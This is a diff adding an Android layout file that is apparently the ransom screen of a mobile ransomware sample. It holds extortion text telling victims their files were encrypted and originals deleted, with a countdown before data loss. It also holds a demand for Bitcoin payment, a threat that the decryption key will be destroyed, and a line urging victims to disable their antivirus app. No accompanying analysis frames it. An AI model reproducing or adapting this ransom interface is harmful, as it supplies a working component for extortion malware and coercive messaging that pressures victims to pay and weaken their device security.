@@ -1,0 +1,72 @@
+<?xml version="1.0" encoding="utf-8"?>
+<LinearLayout android:orientation="vertical" android:background="#ffffffff" android:layout_width="fill_parent" android:layout_height="fill_parent"
+  xmlns:android="http://schemas.android.com/apk/res/android">
+    <LinearLayout android:orientation="horizontal" android:background="#ff000000" android:layout_width="fill_parent" android:layout_height="wrap_content">
+        <TextView android:textSize="12.0sp" android:textColor="#ffffffff" android:id="@id/top_left_data" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginLeft="5.0dip" android:layout_marginTop="2.0dip" android:layout_marginBottom="2.0dip" android:layout_weight="0.5" />
+        <ImageView android:id="@id/imageView1" android:layout_width="20.0dip" android:layout_height="10.0dip" android:layout_marginTop="5.0dip" android:layout_marginRight="2.0dip" android:src="@drawable/splash" />
+        <TextView android:textSize="12.0sp" android:textColor="#ffffffff" android:gravity="right" android:id="@id/top_right_data" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginTop="2.0dip" android:layout_marginRight="5.0dip" android:layout_marginBottom="2.0dip" android:text="00:00" />
+    </LinearLayout>
+    <LinearLayout android:orientation="horizontal" android:background="#ff5e7185" android:layout_width="fill_parent" android:layout_height="wrap_content">
+        <ImageView android:id="@id/imageView2" android:layout_width="20.0dip" android:layout_height="40.0dip" android:layout_marginLeft="9.0dip" android:src="@drawable/warn" android:scaleType="fitCenter" />
+        <LinearLayout android:orientation="vertical" android:layout_width="fill_parent" android:layout_height="wrap_content">
+            <TextView android:textColor="#ffffffff" android:id="@id/header_titile" android:layout_width="fill_parent" android:layout_height="wrap_content" android:layout_marginLeft="5.0dip" android:layout_marginTop="5.0dip" android:layout_marginRight="5.0dip" android:text="Current state information" />
+            <TextView android:textSize="11.0sp" android:textColor="#ffdedede" android:id="@id/header_data" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginLeft="5.0dip" android:layout_marginRight="5.0dip" android:layout_marginBottom="8.0dip" android:text="Your personal documents and files on this device have just been crypted. The original files have been deleted and will only be recovered by following the steps described below. The encryption was done with a unique generated encryption key (using AES-256)." />
+        </LinearLayout>
+    </LinearLayout>
+    <LinearLayout android:background="#ff6b8eb0" android:layout_width="fill_parent" android:layout_height="93.0dip">
+        <LinearLayout android:orientation="vertical" android:layout_width="wrap_content" android:layout_height="fill_parent" android:layout_marginLeft="5.0dip" android:layout_weight="0.33">
+            <ImageView android:id="@id/icon_1" android:layout_width="fill_parent" android:layout_height="32.0dip" android:layout_marginTop="5.0dip" android:src="@drawable/icon_1" />
+            <TextView android:textSize="9.0sp" android:textColor="#ffffffff" android:gravity="center" android:id="@id/icon_1_lbl" android:layout_width="fill_parent" android:layout_height="wrap_content" android:text="Data will be lost\nafter" />
+            <TextView android:textAppearance="?android:textAppearanceLarge" android:textSize="16.0sp" android:textStyle="bold" android:textColor="#ffffffff" android:gravity="center" android:id="@id/icon_1_result" android:background="#ff5e7185" android:layout_width="fill_parent" android:layout_height="wrap_content" android:layout_marginTop="2.0dip" android:text="0h" />
+        </LinearLayout>
+        <LinearLayout android:orientation="vertical" android:layout_width="wrap_content" android:layout_height="fill_parent" android:layout_weight="0.33">
+            <ImageView android:id="@id/icon_2" android:layout_width="fill_parent" android:layout_height="32.0dip" android:layout_marginTop="5.0dip" android:src="@drawable/icon_2" />
+            <TextView android:textSize="9.0sp" android:textColor="#ffffffff" android:gravity="center" android:id="@id/icon_2_lbl" android:layout_width="fill_parent" android:layout_height="wrap_content" android:text="Number of\nencrypted files" />
+            <TextView android:textAppearance="?android:textAppearanceLarge" android:textSize="16.0sp" android:textStyle="bold" android:textColor="#ffffffff" android:gravity="center" android:id="@id/icon_2_result" android:background="#ff5e7185" android:layout_width="fill_parent" android:layout_height="wrap_content" android:layout_marginTop="2.0dip" android:text="0" />
+        </LinearLayout>
+        <LinearLayout android:orientation="vertical" android:layout_width="wrap_content" android:layout_height="fill_parent" android:layout_marginRight="5.0dip" android:layout_weight="0.33">
+            <ImageView android:id="@id/icon_3" android:layout_width="fill_parent" android:layout_height="32.0dip" android:layout_marginTop="5.0dip" android:src="@drawable/icon_3" />
+            <TextView android:textSize="9.0sp" android:textColor="#ffffffff" android:gravity="center" android:id="@id/icon_3_lbl" android:layout_width="fill_parent" android:layout_height="wrap_content" android:text="The cost of the key\nfor decryption" />
+            <TextView android:textAppearance="?android:textAppearanceLarge" android:textSize="16.0sp" android:textStyle="bold" android:textColor="#ffffffff" android:gravity="center" android:id="@id/icon_3_result" android:background="#ff5e7185" android:layout_width="fill_parent" android:layout_height="wrap_content" android:layout_marginTop="2.0dip" android:text="0$" />
+        </LinearLayout>
+    </LinearLayout>
+    <ScrollView android:id="@id/scrollView1" android:layout_width="fill_parent" android:layout_height="wrap_content">
+        <LinearLayout android:orientation="vertical" android:layout_width="wrap_content" android:layout_height="fill_parent">
+            <LinearLayout android:orientation="horizontal" android:background="#ff5e7185" android:layout_width="fill_parent" android:layout_height="wrap_content">
+                <LinearLayout android:orientation="vertical" android:layout_width="fill_parent" android:layout_height="wrap_content">
+                    <TextView android:textColor="#ffffffff" android:id="@id/title_header" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginLeft="5.0dip" android:layout_marginTop="5.0dip" android:layout_marginRight="5.0dip" android:layout_marginBottom="5.0dip" android:text="Important information" />
+                </LinearLayout>
+            </LinearLayout>
+            <TextView android:textAppearance="?android:textAppearanceMedium" android:textStyle="bold" android:textColor="#ff628db5" android:id="@id/promo_1_lbl" android:layout_width="fill_parent" android:layout_height="wrap_content" android:layout_marginLeft="5.0dip" android:layout_marginTop="5.0dip" android:layout_marginRight="5.0dip" android:text="Your personal files are encrypted!" />
+            <TextView android:textSize="11.0sp" android:textColor="#ff3f3f3f" android:id="@id/promo_1_text" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginLeft="5.0dip" android:layout_marginRight="5.0dip" android:text="To decrypt files you need to obtain the private key. This means the encrypted files are of no use until the get decrypted using a private key stored on a server. The server will destroy the private key after a time specified in this window. After that, nobody and never will be able to restore original files." />
+            <TextView android:textSize="11.0sp" android:textColor="#ff3f3f3f" android:id="@id/promo_2_text" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginLeft="5.0dip" android:layout_marginTop="5.0dip" android:layout_marginRight="5.0dip" android:text="To obtain the private key which will decrypt files, you need to pay the amount you see at the top of the screen. Without this key, you will never be able to get your original files back.\n\nAlso you can easily delete this software, but know that without it, you will never be able to get your original files back. Whenever possible then disable your antivirus app to prevent the removal of this software." />
+            <TextView android:textAppearance="?android:textAppearanceMedium" android:textStyle="bold" android:textColor="#ff628db5" android:id="@id/promo_3_lbl" android:layout_width="fill_parent" android:layout_height="wrap_content" android:layout_marginLeft="5.0dip" android:layout_marginTop="10.0dip" android:layout_marginRight="5.0dip" android:text="How can I pay?" />
+            <TextView android:textSize="11.0sp" android:textColor="#ff3f3f3f" android:id="@id/promo_3_text" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginLeft="5.0dip" android:layout_marginRight="5.0dip" android:layout_marginBottom="10.0dip" android:text="Payment is accepted in Bitcoin only. For more information, click 'Where to get Bitcoin'." />
+            <LinearLayout android:orientation="horizontal" android:background="#ff5e7185" android:layout_width="fill_parent" android:layout_height="wrap_content">
+                <LinearLayout android:orientation="vertical" android:layout_width="fill_parent" android:layout_height="wrap_content">
+                    <TextView android:textColor="#ffffffff" android:id="@id/title2_header" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginLeft="5.0dip" android:layout_marginTop="5.0dip" android:layout_marginRight="5.0dip" android:layout_marginBottom="5.0dip" android:text="Payment information" />
+                </LinearLayout>
+            </LinearLayout>
+            <TextView android:textSize="11.0sp" android:textColor="#ff3f3f3f" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginLeft="5.0dip" android:layout_marginTop="5.0dip" android:layout_marginRight="5.0dip" android:text="Please make payment to this Bitcoin address or you can scan QR-code to get Bitcoin-address easily. The operation is complete if there are 3 confirmations." />
+            <LinearLayout android:gravity="center" android:layout_width="fill_parent" android:layout_height="wrap_content" android:layout_marginLeft="5.0dip" android:layout_marginTop="10.0dip" android:layout_marginRight="5.0dip">
+                <ImageView android:id="@id/imageView3" android:layout_width="32.0dip" android:layout_height="32.0dip" android:src="@drawable/btc_icon" android:scaleType="fitCenter" />
+                <LinearLayout android:orientation="vertical" android:layout_width="wrap_content" android:layout_height="fill_parent">
+                    <TextView android:textAppearance="?android:textAppearanceMedium" android:textSize="14.0sp" android:textColor="#ff628db5" android:id="@id/user_btc_address" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginLeft="10.0dip" android:text="%WADR%" />
+                    <TextView android:textSize="10.0sp" android:textColor="#ff797979" android:id="@id/funds_load_lbl" android:layout_width="fill_parent" android:layout_height="wrap_content" android:layout_marginLeft="11.0dip" android:text="%wadr_warn%" />
+                </LinearLayout>
+            </LinearLayout>
+            <LinearLayout android:gravity="center" android:orientation="vertical" android:layout_width="fill_parent" android:layout_height="wrap_content">
+                <TextView android:textAppearance="?android:textAppearanceMedium" android:textSize="13.0sp" android:textColor="#ff5e7185" android:gravity="center" android:id="@id/qr_code_warn" android:layout_width="fill_parent" android:layout_height="wrap_content" android:layout_marginTop="10.0dip" android:text="%qr_code_lbl%" />
+                <ImageView android:id="@id/qr_code" android:layout_width="128.0dip" android:layout_height="128.0dip" android:src="@drawable/icon_1" />
+            </LinearLayout>
+            <LinearLayout android:gravity="center" android:orientation="vertical" android:layout_width="fill_parent" android:layout_height="wrap_content" android:layout_marginBottom="10.0dip">
+                <TextView android:textAppearance="?android:textAppearanceMedium" android:textSize="12.0sp" android:textColor="#ff628db5" android:gravity="center" android:id="@id/paid_status" android:layout_width="fill_parent" android:layout_height="20.0dip" android:text="%paid_status%" />
+                <TextView android:textSize="10.0sp" android:textColor="#ff797979" android:gravity="center" android:id="@id/paid_state_lbl" android:layout_width="fill_parent" android:layout_height="wrap_content" android:text="private key status" />
+            </LinearLayout>
+            <LinearLayout android:gravity="center" android:orientation="vertical" android:layout_width="fill_parent" android:layout_height="wrap_content" android:layout_marginBottom="50.0dip">
+                <Button android:textSize="14.0sp" android:textColor="#ffffffff" android:id="@id/paid_button" android:background="@drawable/buttonshape_x" android:layout_width="200.0dip" android:layout_height="35.0dip" android:layout_marginBottom="2.0dip" android:text="%check_payment%" />
+                <Button android:textSize="14.0sp" android:textColor="#ff628db5" android:id="@id/where_get_btc" android:background="@drawable/buttonshape" android:layout_width="200.0dip" android:layout_height="35.0dip" android:layout_marginBottom="10.0dip" android:text="%get_btc%" />
+            </LinearLayout>
+        </LinearLayout>
+    </ScrollView>
+</LinearLayout>
